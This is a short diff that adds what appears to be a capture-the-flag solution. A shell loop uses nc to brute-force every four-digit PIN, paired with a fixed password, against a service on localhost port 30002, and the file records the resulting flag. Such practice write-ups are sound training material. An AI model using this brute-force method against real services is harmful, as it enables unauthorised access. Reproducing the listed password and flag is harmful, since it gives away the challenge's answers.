@@ -1,0 +1,5 @@
+for i in $(seq -f "%04g" 0 9999); do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | \
+nc localhost 30002 | grep -v 'Wrong'
+
+
+Flag: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
